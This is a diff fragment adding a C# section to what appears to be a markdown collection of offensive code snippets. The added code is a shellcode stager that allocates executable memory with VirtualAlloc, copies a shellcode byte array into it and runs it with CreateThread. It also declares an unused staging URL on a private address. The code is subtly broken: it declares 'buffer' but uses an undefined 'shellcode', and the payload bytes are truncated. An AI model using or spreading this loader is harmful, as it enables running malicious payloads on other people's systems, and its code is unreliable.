@@ -88,7 +88,36 @@ int main()
 
 #### CSharp
 ```csharp
+using System;
+using System.Net;
+using System.Runtime.InteropServices;
 
+namespace stager
+{
+    public class stager
+    {
+        private static string url = "http://192.168.0.44/staging";
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        public static void Main(String[] args)
+        {
+            byte[] buffer= new byte[479] {0x48,0x31,0xd2,0x65,0x48,0x8b,0x42,0x60,0x48......};  // SHELLCODE HERE
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
+            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+            return;
+        }
+    }
+}
 ```
 
 #### PowerShell
